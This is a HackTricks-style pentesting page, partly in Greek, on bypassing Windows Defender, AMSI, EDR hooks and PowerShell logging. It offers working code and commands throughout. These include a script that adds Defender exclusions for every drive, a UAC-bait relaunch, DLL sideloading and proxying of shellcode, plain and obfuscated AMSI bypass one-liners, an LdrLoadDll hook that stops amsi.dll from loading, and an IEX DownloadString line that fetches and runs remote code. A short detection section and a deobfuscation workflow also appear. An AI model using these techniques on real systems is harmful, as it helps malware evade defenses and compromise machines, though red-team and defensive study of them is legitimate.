# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί, προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders που μεταμφιέζονται σε game cheats συχνά διανέμονται ως unsigned Node.js/Nexe installers που πρώτα **ζητούν από τον χρήστη elevation** και μόνο μετά αδρανοποιούν το Defender. Η ροή είναι απλή:

1. Ελέγξτε για administrative context με `net session`. Η εντολή πετυχαίνει μόνο όταν ο καλών έχει admin rights, οπότε μια αποτυχία δείχνει ότι ο loader εκτελείται ως standard user.
2. Αμέσως εκκινεί ξανά τον εαυτό του με το `RunAs` verb για να ενεργοποιήσει το αναμενόμενο UAC consent prompt, διατηρώντας το αρχικό command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” λογισμικό, οπότε το prompt συνήθως γίνεται αποδεκτό, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Blanket `MpPreference` exclusions for every drive letter

Μόλις αποκτήσει elevated δικαιώματα, τα GachiLoader-style chains μεγιστοποιούν τα blind spots του Defender αντί να απενεργοποιούν εντελώς την υπηρεσία. Το loader πρώτα σκοτώνει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και μετά εφαρμόζει **extremely broad exclusions** ώστε κάθε user profile, system directory και removable disk να γίνεται unscannable:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Ο βρόχος περνά από κάθε mounted filesystem (D:\, E:\, USB sticks, etc.) οπότε **οποιοδήποτε future payload dropped οπουδήποτε στο disk αγνοείται**.
- Το `.sys` extension exclusion είναι forward-looking—οι attackers κρατούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να αγγίξουν το Defender ξανά.
- Όλες οι αλλαγές καταλήγουν κάτω από `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε later stages να επιβεβαιώσουν ότι τα exclusions επιμένουν ή να τα επεκτείνουν χωρίς να ξαναενεργοποιήσουν UAC.

Επειδή δεν σταματά κανένα Defender service, τα naïve health checks συνεχίζουν να αναφέρουν “antivirus active” παρότι το real-time inspection δεν αγγίζει ποτέ εκείνα τα paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL files που προσπαθούν να φορτώσουν.

Σου προτείνω πολύ να **εξερευνήσεις μόνος/η σου DLL Hijackable/Sideloadable programs**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσεις publicly known DLL Sideloadable programs, μπορεί να σε πιάσουν εύκολα.

Μόνο με το να τοποθετήσεις ένα malicious DLL με το όνομα που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σου, γιατί το πρόγραμμα περιμένει ορισμένες συγκεκριμένες functions μέσα σε αυτό το DLL, για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις calls που κάνει ένα πρόγραμμα από το proxy (and malicious) DLL προς το original DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας να χειριστούμε την εκτέλεση του payload σου.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από τον [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (encoded με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το έλεγα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Συστήνω **πολύ έντονα** να δείτε το [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) σχετικά με DLL Sideloading και επίσης το [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε σε μεγαλύτερο βάθος.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να export functions που στην πραγματικότητα είναι "forwarders": αντί να δείχνει σε code, η export entry περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller κάνει resolve το export, το Windows loader θα:

- Load το `TargetDll` αν δεν είναι ήδη loaded
- Resolve το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από το προστατευμένο KnownDLLs namespace (π.χ. ntdll, kernelbase, ole32).
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική DLL search order, που περιλαμβάνει το directory του module που κάνει το forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που exportάρει μια function forwarded σε ένα non-KnownDLL module name, και μετά τοποθετήστε μαζί με αυτό το signed DLL ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα με το forwarded target module. Όταν γίνει invoke το forwarded export, ο loader κάνει resolve το forward και φορτώνει το DLL σας από το ίδιο directory, εκτελώντας το DllMain σας.

Παράδειγμα που παρατηρήθηκε στο Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι ένα KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το signed system DLL σε έναν writable φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Ρίξε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain είναι αρκετό για να πετύχεις code execution; δεν χρειάζεται να υλοποιήσεις τη forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποίησε το forward με ένα signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς `NCRYPTPROV.SetAuditingInterface`
- Ο loader στη συνέχεια φορτώνει το `NCRYPTPROV.dll` από `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν έχει υλοποιηθεί, θα πάρεις σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Εστίασε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείς να απαριθμήσεις forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψηφίους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ιδέες:
- Παρακολουθήστε LOLBins (π.χ. rundll32.exe) να φορτώνουν signed DLLs από non-system paths, ακολουθούμενα από φόρτωση non-KnownDLLs με το ίδιο base name από εκείνο το directory
- Alert σε process/module chains όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` κάτω από user-writable paths
- Εφαρμόστε code integrity policies (WDAC/AppLocker) και αρνηθείτε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealthy τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το Evasion είναι απλώς ένα cat & mouse game, ό,τι δουλεύει σήμερα μπορεί να ανιχνευθεί αύριο, οπότε μην βασίζεσαι ποτέ μόνο σε ένα tool· αν είναι δυνατόν, προσπάθησε να αλυσιδώσεις πολλαπλές evasion techniques.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDRs συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψεις αυτά τα hooks, μπορείς να δημιουργήσεις **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: εκτέλεσε μια `syscall`/`sysenter`/`SVC #0` instruction στο generated stub (χωρίς `ntdll` export hit).
- **Indirect**: κάνε jump μέσα σε ένα υπάρχον `syscall` gadget στο `ntdll` ώστε η kernel transition να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion)· το **randomized indirect** επιλέγει ένα gadget από ένα pool ανά κλήση.
- **Egg-hunt**: απέφυγε να ενσωματώσεις τη στατική ακολουθία opcode `0F 05` στο disk· επίλυσε μια syscall sequence στο runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: εξήγαγε SSNs ταξινομώντας τα syscall stubs με βάση το virtual address αντί να διαβάζεις τα stub bytes.
- **SyscallsFromDisk**: κάνε map ένα καθαρό `\KnownDlls\ntdll.dll`, διάβασε τα SSNs από το `.text`, και μετά κάνε unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδύασε VA-sorted SSN inference με opcode validation όταν ένα stub είναι clean· κάνε fallback στο VA inference αν είναι hooked.
- **HW Breakpoint**: βάλε DR0 στο `syscall` instruction και χρησιμοποίησε ένα VEH για να capture το SSN από το `EAX` στο runtime, χωρίς να κάνεις parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs μπορούσαν να σκανάρουν μόνο **files on disk**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **directly in-memory**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε αρκετή ορατότητα.

Το χαρακτηριστικό AMSI είναι ενσωματωμένο σε αυτά τα components των Windows.

- User Account Control, ή UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις antivirus solutions να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας το περιεχόμενό τους σε μορφή που είναι τόσο unencrypted όσο και unobfuscated.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα εμφανίσει το παρακάτω alert στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προσθέτει το `amsi:` στην αρχή και μετά το path προς το executable από το οποίο εκτελέστηκε το script, σε αυτή την περίπτωση, powershell.exe

Δεν αφήσαμε κανένα file στο disk, αλλά παρ' όλα αυτά μας έπιασε in-memory λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης μέσω AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή χαμηλότερη) για in-memory execution αν θέλεις να αποφύγεις το AMSI.

Υπάρχουν μερικοί τρόποι να παρακάμψεις το AMSI:

- **Obfuscation**

Αφού το AMSI δουλεύει κυρίως με static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι καλός τρόπος για evading detection.

Ωστόσο, το AMSI έχει τη δυνατότητα να unobfuscating scripts ακόμη κι αν έχουν πολλαπλά layers, οπότε το obfuscation μπορεί να είναι κακή επιλογή ανάλογα με το πώς γίνεται. Αυτό κάνει την παράκαμψη όχι τόσο straightforward. Παρ' όλα αυτά, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξεις μερικά variable names και θα είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει flagged κάτι.

- **AMSI Bypass**

Αφού το AMSI υλοποιείται φορτώνοντας ένα DLL μέσα στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, etc.), είναι δυνατό να το παραποιήσεις εύκολα ακόμη και αν τρέχεις ως unprivileged user. Λόγω αυτής της αδυναμίας στην υλοποίηση του AMSI, οι researchers έχουν βρει πολλούς τρόπους να παρακάμπτουν το AMSI scanning.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μη γίνει κανένα scan για την τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη χρησιμοποιήσιμο για το τρέχον powershell process. Αυτή η γραμμή φυσικά έχει ήδη επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η technique.

Εδώ είναι ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Θυμήσου ότι αυτό πιθανότατα θα γίνει flagged μόλις βγει αυτό το post, οπότε δεν πρέπει να δημοσιεύσεις code αν ο στόχος σου είναι να παραμείνεις undetected.

**Memory Patching**

Αυτή η technique ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της address για τη function "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για scanning του input που δίνει ο user) και την αντικατάστασή της με instructions που επιστρέφουν τον code για E_INVALIDARG, έτσι ώστε το αποτέλεσμα του πραγματικού scan να επιστρέφει 0, το οποίο ερμηνεύεται ως clean result.

> [!TIP]
> Διάβασε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο αναλυτική εξήγηση.

Υπάρχουν επίσης πολλές άλλες techniques που χρησιμοποιούνται για να γίνει bypass το AMSI με powershell, δες αυτή τη σελίδα [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και αυτό το [**repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθεις περισσότερα για αυτές.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

Το AMSI αρχικοποιείται μόνο αφού φορτωθεί το `amsi.dll` στο τρέχον process. Ένα robust, language‑agnostic bypass είναι να τοποθετηθεί ένα user‑mode hook στο `ntdll!LdrLoadDll` που επιστρέφει error όταν το requested module είναι `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν εκτελούνται scans για εκείνο το process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders alike (οτιδήποτε αλλιώς θα φόρτωνε AMSI).
- Συνδύασέ το με τη διοχέτευση scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγεις long command-line artefacts.
- Έχει παρατηρηθεί να χρησιμοποιείται από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί `DllRegisterServer`).

Το tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** επίσης δημιουργεί script για να παρακάμψει το AMSI.
Το tool **[https://amsibypass.com/](https://amsibypass.com/)** επίσης δημιουργεί script για να παρακάμψει το AMSI που αποφεύγει signature με randomized user-defined function, variables, characters expression και εφαρμόζει random character casing στα PowerShell keywords για να αποφύγει signature.

**Remove the detected signature**

Μπορείς να χρησιμοποιήσεις ένα tool όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσεις το detected AMSI signature από τη μνήμη της τρέχουσας process. Αυτό το tool λειτουργεί σκανάροντας τη μνήμη της τρέχουσας process για το AMSI signature και στη συνέχεια το αντικαθιστά με NOP instructions, αφαιρώντας το effectively από τη μνήμη.

**AV/EDR products that uses AMSI**

Μπορείς να βρεις μια λίστα από AV/EDR products που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Αν χρησιμοποιείς PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να εκτελέσεις τα scripts σου χωρίς να σκαναριστούν από το AMSI. Μπορείς να το κάνεις έτσι:
```bash
powershell.exe -version 2
```
## PS Logging

Το PowerShell logging είναι μια δυνατότητα που σου επιτρέπει να καταγράφεις όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελεί ένα **πρόβλημα για attackers που θέλουν να evade detection**.

Για να bypass το PowerShell logging, μπορείς να χρησιμοποιήσεις τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείς να χρησιμοποιήσεις ένα tool όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσεις PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να τρέξεις τα scripts σου χωρίς να γίνονται scanned από το AMSI. Μπορείς να το κάνεις έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποίησε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να spawn ένα powershell without defenses (αυτό χρησιμοποιεί το `powerpick` από Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Όταν αναλύεις malware που χρησιμοποιεί ConfuserEx 2 (ή commercial forks) είναι συνηθισμένο να αντιμετωπίζεις several layers of protection που θα μπλοκάρουν decompilers και sandboxes. Το παρακάτω workflow αποκαθιστά αξιόπιστα ένα σχεδόν–αρχικό IL το οποίο μετά μπορεί να γίνει decompiled σε C# σε tools όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – Το ConfuserEx encrypts κάθε *method body* και το decrypts μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης κάνει patch το PE checksum, οπότε οποιαδήποτε modification θα κρασάρει το binary. Χρησιμοποίησε το **AntiTamperKiller** για να εντοπίσεις τους encrypted metadata tables, να ανακτήσεις τα XOR keys και να ξαναγράψεις ένα clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τα 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμα όταν φτιάχνεις τον δικό σου unpacker.

2.  Symbol / control-flow recovery – δώσε το *clean* file στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select το ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – το ConfuserEx αντικαθιστά direct method calls με lightweight wrappers (a.k.a *proxy calls*) για να σπάσει περισσότερο το decompilation. Αφαίρεσέ τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να βλέπεις κανονικό .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για opaque wrapper functions (`Class8.smethod_10`, …).

